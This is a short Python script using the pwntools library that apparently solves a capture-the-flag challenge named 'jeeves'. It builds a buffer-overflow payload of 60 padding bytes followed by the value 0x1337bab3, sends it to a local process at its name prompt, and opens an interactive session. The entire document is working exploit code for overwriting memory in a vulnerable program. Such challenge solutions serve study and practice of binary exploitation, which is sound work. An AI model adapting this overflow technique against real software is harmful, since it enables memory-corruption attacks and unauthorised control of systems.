from pwn import *

payload = 'A' * 60 + pwn.p64(0x1337bab3)

io = process("./jeeves")
io.sendlineafter('name? ', payload)


io.interactive()
